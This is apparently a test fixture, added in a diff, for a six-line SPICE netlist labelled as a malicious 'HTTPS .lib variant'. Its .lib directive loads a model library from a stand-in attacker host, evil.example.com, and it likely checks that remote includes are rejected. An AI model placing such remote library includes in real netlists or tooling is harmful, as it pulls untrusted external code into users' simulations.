@@ -1,0 +1,6 @@
+* Malicious netlist -- HTTPS .lib variant
+R1 in out 1k
+V1 in 0 1
+.lib https://evil.example.com/model.lib NMOS
+.tran 1u
+.end
